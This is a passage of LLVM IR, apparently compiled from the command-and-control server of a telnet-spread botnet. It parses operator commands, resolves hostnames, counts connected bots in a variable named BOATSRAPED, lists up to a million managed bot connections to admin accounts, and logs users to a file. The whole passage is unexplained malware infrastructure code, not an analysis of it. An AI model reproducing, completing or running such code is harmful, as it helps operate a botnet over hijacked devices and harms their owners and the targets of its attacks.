  br i1 %308, label %309, label %321

309:                                              ; preds = %305
  %310 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %311 = load volatile i32, i32* @BOATSRAPED, align 4
  %312 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %310, i8* noundef getelementptr inbounds ([34 x i8], [34 x i8]* @.str.44, i64 0, i64 0), i32 noundef %311) #11
  %313 = load i32, i32* %4, align 4
  %314 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %315 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %316 = call i64 @strlen(i8* noundef %315) #9
  %317 = call i64 @send(i32 noundef %313, i8* noundef %314, i64 noundef %316, i32 noundef 16384)
  %318 = icmp eq i64 %317, -1
  br i1 %318, label %319, label %320

319:                                              ; preds = %309
  br label %320

320:                                              ; preds = %319, %309
  br label %321

321:                                              ; preds = %320, %305
  %322 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %323 = call i8* @strstr(i8* noundef %322, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.45, i64 0, i64 0)) #9
  %324 = icmp ne i8* %323, null
  br i1 %324, label %325, label %347

325:                                              ; preds = %321
  %326 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %327 = call i8* @strtok(i8* noundef %326, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i64 0, i64 0)) #11
  store i8* %327, i8** %30, align 8
  %328 = load i8*, i8** %30, align 8
  %329 = getelementptr inbounds i8, i8* %328, i64 8
  store i8* %329, i8** %31, align 8
  %330 = load i8*, i8** %31, align 8
  call void @trim(i8* noundef %330)
  %331 = load i8*, i8** %31, align 8
  %332 = getelementptr inbounds [100 x i8*], [100 x i8*]* %29, i64 0, i64 0
  %333 = bitcast i8** %332 to i8*
  %334 = call i32 @hostname_to_ip(i8* noundef %331, i8* noundef %333)
  %335 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %336 = load i8*, i8** %31, align 8
  %337 = getelementptr inbounds [100 x i8*], [100 x i8*]* %29, i64 0, i64 0
  %338 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %335, i8* noundef getelementptr inbounds ([28 x i8], [28 x i8]* @.str.47, i64 0, i64 0), i8* noundef %336, i8** noundef %337) #11
  %339 = load i32, i32* %4, align 4
  %340 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %341 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %342 = call i64 @strlen(i8* noundef %341) #9
  %343 = call i64 @send(i32 noundef %339, i8* noundef %340, i64 noundef %342, i32 noundef 16384)
  %344 = icmp eq i64 %343, -1
  br i1 %344, label %345, label %346

345:                                              ; preds = %325
  br label %346

346:                                              ; preds = %345, %325
  br label %347

347:                                              ; preds = %346, %321
  %348 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %349 = call i8* @strstr(i8* noundef %348, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.48, i64 0, i64 0)) #9
  %350 = icmp ne i8* %349, null
  br i1 %350, label %351, label %382

351:                                              ; preds = %347
  %352 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %353 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %352, i8* noundef getelementptr inbounds ([37 x i8], [37 x i8]* @.str.49, i64 0, i64 0)) #11
  %354 = load i32, i32* %4, align 4
  %355 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %356 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %357 = call i64 @strlen(i8* noundef %356) #9
  %358 = call i64 @send(i32 noundef %354, i8* noundef %355, i64 noundef %357, i32 noundef 16384)
  %359 = icmp eq i64 %358, -1
  br i1 %359, label %360, label %361

360:                                              ; preds = %351
  br label %361

361:                                              ; preds = %360, %351
  %362 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %363 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %362, i8* noundef getelementptr inbounds ([36 x i8], [36 x i8]* @.str.50, i64 0, i64 0)) #11
  %364 = load i32, i32* %4, align 4
  %365 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %366 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %367 = call i64 @strlen(i8* noundef %366) #9
  %368 = call i64 @send(i32 noundef %364, i8* noundef %365, i64 noundef %367, i32 noundef 16384)
  %369 = icmp eq i64 %368, -1
  br i1 %369, label %370, label %371

370:                                              ; preds = %361
  br label %371

371:                                              ; preds = %370, %361
  %372 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %373 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %372, i8* noundef getelementptr inbounds ([29 x i8], [29 x i8]* @.str.51, i64 0, i64 0)) #11
  %374 = load i32, i32* %4, align 4
  %375 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %376 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %377 = call i64 @strlen(i8* noundef %376) #9
  %378 = call i64 @send(i32 noundef %374, i8* noundef %375, i64 noundef %377, i32 noundef 16384)
  %379 = icmp eq i64 %378, -1
  br i1 %379, label %380, label %381

380:                                              ; preds = %371
  br label %381

381:                                              ; preds = %380, %371
  br label %382

382:                                              ; preds = %381, %347
  %383 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %384 = call i8* @strstr(i8* noundef %383, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i64 0, i64 0)) #9
  %385 = icmp ne i8* %384, null
  br i1 %385, label %386, label %417

386:                                              ; preds = %382
  %387 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %388 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %387, i8* noundef getelementptr inbounds ([29 x i8], [29 x i8]* @.str.53, i64 0, i64 0)) #11
  %389 = load i32, i32* %4, align 4
  %390 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %391 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %392 = call i64 @strlen(i8* noundef %391) #9
  %393 = call i64 @send(i32 noundef %389, i8* noundef %390, i64 noundef %392, i32 noundef 16384)
  %394 = icmp eq i64 %393, -1
  br i1 %394, label %395, label %396

395:                                              ; preds = %386
  br label %396

396:                                              ; preds = %395, %386
  %397 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %398 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %397, i8* noundef getelementptr inbounds ([29 x i8], [29 x i8]* @.str.54, i64 0, i64 0)) #11
  %399 = load i32, i32* %4, align 4
  %400 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %401 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %402 = call i64 @strlen(i8* noundef %401) #9
  %403 = call i64 @send(i32 noundef %399, i8* noundef %400, i64 noundef %402, i32 noundef 16384)
  %404 = icmp eq i64 %403, -1
  br i1 %404, label %405, label %406

405:                                              ; preds = %396
  br label %406

406:                                              ; preds = %405, %396
  %407 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %408 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %407, i8* noundef getelementptr inbounds ([28 x i8], [28 x i8]* @.str.55, i64 0, i64 0)) #11
  %409 = load i32, i32* %4, align 4
  %410 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %411 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %412 = call i64 @strlen(i8* noundef %411) #9
  %413 = call i64 @send(i32 noundef %409, i8* noundef %410, i64 noundef %412, i32 noundef 16384)
  %414 = icmp eq i64 %413, -1
  br i1 %414, label %415, label %416

415:                                              ; preds = %406
  br label %416

416:                                              ; preds = %415, %406
  br label %417

417:                                              ; preds = %416, %382
  %418 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %419 = call i8* @strstr(i8* noundef %418, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.56, i64 0, i64 0)) #9
  %420 = icmp ne i8* %419, null
  br i1 %420, label %421, label %502

421:                                              ; preds = %417
  %422 = load i8*, i8** %12, align 8
  %423 = load i32, i32* %5, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %424
  %426 = getelementptr inbounds %struct.account, %struct.account* %425, i32 0, i32 2
  %427 = getelementptr inbounds [200 x i8], [200 x i8]* %426, i64 0, i64 0
  %428 = call i32 @strcmp(i8* noundef %422, i8* noundef %427) #9
  %429 = icmp eq i32 %428, 0
  br i1 %429, label %439, label %430

430:                                              ; preds = %421
  %431 = load i8*, i8** %13, align 8
  %432 = load i32, i32* %5, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %433
  %435 = getelementptr inbounds %struct.account, %struct.account* %434, i32 0, i32 2
  %436 = getelementptr inbounds [200 x i8], [200 x i8]* %435, i64 0, i64 0
  %437 = call i32 @strcmp(i8* noundef %431, i8* noundef %436) #9
  %438 = icmp eq i32 %437, 0
  br i1 %438, label %439, label %490

439:                                              ; preds = %430, %421
  %440 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %441 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %440, i8* noundef getelementptr inbounds ([51 x i8], [51 x i8]* @.str.57, i64 0, i64 0)) #11
  %442 = load i32, i32* %4, align 4
  %443 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %444 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %445 = call i64 @strlen(i8* noundef %444) #9
  %446 = call i64 @send(i32 noundef %442, i8* noundef %443, i64 noundef %445, i32 noundef 16384)
  %447 = icmp eq i64 %446, -1
  br i1 %447, label %448, label %449

448:                                              ; preds = %439
  br label %449

449:                                              ; preds = %448, %439
  %450 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %451 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %450, i8* noundef getelementptr inbounds ([46 x i8], [46 x i8]* @.str.58, i64 0, i64 0)) #11
  %452 = load i32, i32* %4, align 4
  %453 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %454 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %455 = call i64 @strlen(i8* noundef %454) #9
  %456 = call i64 @send(i32 noundef %452, i8* noundef %453, i64 noundef %455, i32 noundef 16384)
  %457 = icmp eq i64 %456, -1
  br i1 %457, label %458, label %459

458:                                              ; preds = %449
  br label %459

459:                                              ; preds = %458, %449
  %460 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %461 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %460, i8* noundef getelementptr inbounds ([66 x i8], [66 x i8]* @.str.59, i64 0, i64 0)) #11
  %462 = load i32, i32* %4, align 4
  %463 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %464 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %465 = call i64 @strlen(i8* noundef %464) #9
  %466 = call i64 @send(i32 noundef %462, i8* noundef %463, i64 noundef %465, i32 noundef 16384)
  %467 = icmp eq i64 %466, -1
  br i1 %467, label %468, label %469

468:                                              ; preds = %459
  br label %469

469:                                              ; preds = %468, %459
  %470 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %471 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %470, i8* noundef getelementptr inbounds ([32 x i8], [32 x i8]* @.str.60, i64 0, i64 0)) #11
  %472 = load i32, i32* %4, align 4
  %473 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %474 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %475 = call i64 @strlen(i8* noundef %474) #9
  %476 = call i64 @send(i32 noundef %472, i8* noundef %473, i64 noundef %475, i32 noundef 16384)
  %477 = icmp eq i64 %476, -1
  br i1 %477, label %478, label %479

478:                                              ; preds = %469
  br label %479

479:                                              ; preds = %478, %469
  %480 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %481 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %480, i8* noundef getelementptr inbounds ([39 x i8], [39 x i8]* @.str.61, i64 0, i64 0)) #11
  %482 = load i32, i32* %4, align 4
  %483 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %484 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %485 = call i64 @strlen(i8* noundef %484) #9
  %486 = call i64 @send(i32 noundef %482, i8* noundef %483, i64 noundef %485, i32 noundef 16384)
  %487 = icmp eq i64 %486, -1
  br i1 %487, label %488, label %489

488:                                              ; preds = %479
  br label %489

489:                                              ; preds = %488, %479
  br label %501

490:                                              ; preds = %430
  %491 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %492 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %491, i8* noundef getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i64 0, i64 0)) #11
  %493 = load i32, i32* %4, align 4
  %494 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %495 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %496 = call i64 @strlen(i8* noundef %495) #9
  %497 = call i64 @send(i32 noundef %493, i8* noundef %494, i64 noundef %496, i32 noundef 16384)
  %498 = icmp eq i64 %497, -1
  br i1 %498, label %499, label %500

499:                                              ; preds = %490
  br label %500

500:                                              ; preds = %499, %490
  br label %501

501:                                              ; preds = %500, %489
  br label %502

502:                                              ; preds = %501, %417
  %503 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %504 = call i8* @strstr(i8* noundef %503, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i64 0, i64 0)) #9
  %505 = icmp ne i8* %504, null
  br i1 %505, label %506, label %527

506:                                              ; preds = %502
  %507 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %508 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %507, i8* noundef getelementptr inbounds ([28 x i8], [28 x i8]* @.str.64, i64 0, i64 0)) #11
  %509 = load i32, i32* %4, align 4
  %510 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %511 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %512 = call i64 @strlen(i8* noundef %511) #9
  %513 = call i64 @send(i32 noundef %509, i8* noundef %510, i64 noundef %512, i32 noundef 16384)
  %514 = icmp eq i64 %513, -1
  br i1 %514, label %515, label %516

515:                                              ; preds = %506
  br label %516

516:                                              ; preds = %515, %506
  %517 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %518 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %517, i8* noundef getelementptr inbounds ([24 x i8], [24 x i8]* @.str.65, i64 0, i64 0)) #11
  %519 = load i32, i32* %4, align 4
  %520 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %521 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %522 = call i64 @strlen(i8* noundef %521) #9
  %523 = call i64 @send(i32 noundef %519, i8* noundef %520, i64 noundef %522, i32 noundef 16384)
  %524 = icmp eq i64 %523, -1
  br i1 %524, label %525, label %526

525:                                              ; preds = %516
  br label %526

526:                                              ; preds = %525, %516
  br label %527

527:                                              ; preds = %526, %502
  %528 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %529 = call i8* @strstr(i8* noundef %528, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i64 0, i64 0)) #9
  %530 = icmp ne i8* %529, null
  br i1 %530, label %535, label %531

531:                                              ; preds = %527
  %532 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %533 = call i8* @strstr(i8* noundef %532, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i64 0, i64 0)) #9
  %534 = icmp ne i8* %533, null
  br i1 %534, label %535, label %567

535:                                              ; preds = %531, %527
  %536 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %537 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %536, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i64 0, i64 0)) #11
  %538 = load i32, i32* %4, align 4
  %539 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %540 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %541 = call i64 @strlen(i8* noundef %540) #9
  %542 = call i64 @send(i32 noundef %538, i8* noundef %539, i64 noundef %541, i32 noundef 16384)
  %543 = icmp eq i64 %542, -1
  br i1 %543, label %544, label %545

544:                                              ; preds = %535
  br label %545

545:                                              ; preds = %544, %535
  %546 = load i32, i32* %4, align 4
  %547 = call i64 @send(i32 noundef %546, i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.69, i64 0, i64 0), i64 noundef 17, i32 noundef 16384)
  %548 = icmp eq i64 %547, -1
  br i1 %548, label %549, label %550

549:                                              ; preds = %545
  br label %960

550:                                              ; preds = %545
  %551 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %551, %struct._IO_FILE** %32, align 8
  %552 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %553 = load i32, i32* %5, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %554
  %556 = getelementptr inbounds %struct.account, %struct.account* %555, i32 0, i32 0
  %557 = getelementptr inbounds [200 x i8], [200 x i8]* %556, i64 0, i64 0
  %558 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %552, i8* noundef getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i64 0, i64 0), i8* noundef %557)
  %559 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %560 = call i32 @fclose(%struct._IO_FILE* noundef %559)
  %561 = load i32, i32* %5, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %562
  %564 = getelementptr inbounds %struct.account, %struct.account* %563, i32 0, i32 0
  %565 = getelementptr inbounds [200 x i8], [200 x i8]* %564, i64 0, i64 0
  %566 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i64 0, i64 0), i8* noundef %565)
  br label %567

567:                                              ; preds = %550, %531
  %568 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %569 = call i8* @strstr(i8* noundef %568, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0)) #9
  %570 = icmp ne i8* %569, null
  br i1 %570, label %571, label %588

571:                                              ; preds = %567
  %572 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %572, %struct._IO_FILE** %33, align 8
  %573 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %574 = load i32, i32* %5, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %575
  %577 = getelementptr inbounds %struct.account, %struct.account* %576, i32 0, i32 0
  %578 = getelementptr inbounds [200 x i8], [200 x i8]* %577, i64 0, i64 0
  %579 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %573, i8* noundef getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i64 0, i64 0), i8* noundef %578)
  %580 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %581 = call i32 @fclose(%struct._IO_FILE* noundef %580)
  %582 = load i32, i32* %5, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %583
  %585 = getelementptr inbounds %struct.account, %struct.account* %584, i32 0, i32 0
  %586 = getelementptr inbounds [200 x i8], [200 x i8]* %585, i64 0, i64 0
  %587 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i64 0, i64 0), i8* noundef %586)
  br label %588

588:                                              ; preds = %571, %567
  %589 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %590 = call i8* @strstr(i8* noundef %589, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.74, i64 0, i64 0)) #9
  %591 = icmp ne i8* %590, null
  br i1 %591, label %592, label %598

592:                                              ; preds = %588
  %593 = load i32, i32* %4, align 4
  %594 = call i64 @send(i32 noundef %593, i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i64 0, i64 0), i64 noundef 16, i32 noundef 16384)
  %595 = icmp eq i64 %594, -1
  br i1 %595, label %596, label %597

596:                                              ; preds = %592
  br label %960

597:                                              ; preds = %592
  br label %598

598:                                              ; preds = %597, %588
  %599 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %600 = call i8* @strstr(i8* noundef %599, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i64 0, i64 0)) #9
  %601 = icmp ne i8* %600, null
  br i1 %601, label %602, label %683

602:                                              ; preds = %598
  %603 = load i8*, i8** %12, align 8
  %604 = load i32, i32* %5, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %605
  %607 = getelementptr inbounds %struct.account, %struct.account* %606, i32 0, i32 2
  %608 = getelementptr inbounds [200 x i8], [200 x i8]* %607, i64 0, i64 0
  %609 = call i32 @strcmp(i8* noundef %603, i8* noundef %608) #9
  %610 = icmp eq i32 %609, 0
  br i1 %610, label %620, label %611

611:                                              ; preds = %602
  %612 = load i8*, i8** %13, align 8
  %613 = load i32, i32* %5, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %614
  %616 = getelementptr inbounds %struct.account, %struct.account* %615, i32 0, i32 2
  %617 = getelementptr inbounds [200 x i8], [200 x i8]* %616, i64 0, i64 0
  %618 = call i32 @strcmp(i8* noundef %612, i8* noundef %617) #9
  %619 = icmp eq i32 %618, 0
  br i1 %619, label %620, label %671

620:                                              ; preds = %611, %602
  %621 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %622 = call i8* @strcpy(i8* noundef %621, i8* noundef getelementptr inbounds ([39 x i8], [39 x i8]* @.str.76, i64 0, i64 0)) #11
  %623 = load i32, i32* %4, align 4
  %624 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %625 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %626 = call i64 @strlen(i8* noundef %625) #9
  %627 = call i64 @send(i32 noundef %623, i8* noundef %624, i64 noundef %626, i32 noundef 16384)
  %628 = icmp eq i64 %627, -1
  br i1 %628, label %629, label %630

629:                                              ; preds = %620
  store i8* null, i8** %2, align 8
  br label %969

630:                                              ; preds = %620
  store i32 0, i32* %34, align 4
  br label %631

631:                                              ; preds = %667, %630
  %632 = load i32, i32* %34, align 4
  %633 = icmp slt i32 %632, 1000000
  br i1 %633, label %634, label %670

634:                                              ; preds = %631
  %635 = load i32, i32* %34, align 4
  %636 = sext i32 %635 to i64
  %637 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %636
  %638 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %637, i32 0, i32 2
  %639 = getelementptr inbounds [20 x i8], [20 x i8]* %638, i64 0, i64 0
  %640 = call i64 @strlen(i8* noundef %639) #9
  %641 = icmp ugt i64 %640, 1
  br i1 %641, label %642, label %666

642:                                              ; preds = %634
  %643 = load i32, i32* %34, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %644
  %646 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %645, i32 0, i32 1
  %647 = load i32, i32* %646, align 4
  %648 = icmp eq i32 %647, 1
  br i1 %648, label %649, label %666

649:                                              ; preds = %642
  %650 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %651 = load i32, i32* %34, align 4
  %652 = load i32, i32* %34, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %653
  %655 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %654, i32 0, i32 2
  %656 = getelementptr inbounds [20 x i8], [20 x i8]* %655, i64 0, i64 0
  %657 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %650, i8* noundef getelementptr inbounds ([37 x i8], [37 x i8]* @.str.77, i64 0, i64 0), i32 noundef %651, i8* noundef %656) #11
  %658 = load i32, i32* %4, align 4
  %659 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %660 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %661 = call i64 @strlen(i8* noundef %660) #9
  %662 = call i64 @send(i32 noundef %658, i8* noundef %659, i64 noundef %661, i32 noundef 16384)
  %663 = icmp eq i64 %662, -1
  br i1 %663, label %664, label %665

664:                                              ; preds = %649
  store i8* null, i8** %2, align 8
  br label %969

665:                                              ; preds = %649
  br label %666

666:                                              ; preds = %665, %642, %634
  br label %667

667:                                              ; preds = %666
  %668 = load i32, i32* %34, align 4
  %669 = add nsw i32 %668, 1
  store i32 %669, i32* %34, align 4
  br label %631, !llvm.loop !26

670:                                              ; preds = %631
  br label %682

671:                                              ; preds = %611
  %672 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %673 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %672, i8* noundef getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i64 0, i64 0)) #11
  %674 = load i32, i32* %4, align 4
  %675 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %676 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %677 = call i64 @strlen(i8* noundef %676) #9
  %678 = call i64 @send(i32 noundef %674, i8* noundef %675, i64 noundef %677, i32 noundef 16384)
  %679 = icmp eq i64 %678, -1
  br i1 %679, label %680, label %681

680:                                              ; preds = %671
  br label %681

681:                                              ; preds = %680, %671
  br label %682

682:                                              ; preds = %681, %670
  br label %683

683:                                              ; preds = %682, %598
  %684 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %685 = call i8* @strstr(i8* noundef %684, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i64 0, i64 0)) #9
  %686 = icmp ne i8* %685, null
  br i1 %686, label %687, label %837

687:                                              ; preds = %683
  %688 = load i8*, i8** %13, align 8
  %689 = load i32, i32* %5, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %690
  %692 = getelementptr inbounds %struct.account, %struct.account* %691, i32 0, i32 2
  %693 = getelementptr inbounds [200 x i8], [200 x i8]* %692, i64 0, i64 0
  %694 = call i32 @strcmp(i8* noundef %688, i8* noundef %693) #9
  %695 = icmp eq i32 %694, 0
  br i1 %695, label %705, label %696

696:                                              ; preds = %687
  %697 = load i8*, i8** %13, align 8
  %698 = load i32, i32* %5, align 4
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %699
  %701 = getelementptr inbounds %struct.account, %struct.account* %700, i32 0, i32 2
  %702 = getelementptr inbounds [200 x i8], [200 x i8]* %701, i64 0, i64 0
  %703 = call i32 @strcmp(i8* noundef %697, i8* noundef %702) #9
  %704 = icmp eq i32 %703, 0
  br i1 %704, label %705, label %825

705:                                              ; preds = %696, %687
  %706 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %707 = call i8* @strstr(i8* noundef %706, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i64 0, i64 0)) #9
  %708 = icmp ne i8* %707, null
  br i1 %708, label %713, label %709

709:                                              ; preds = %705
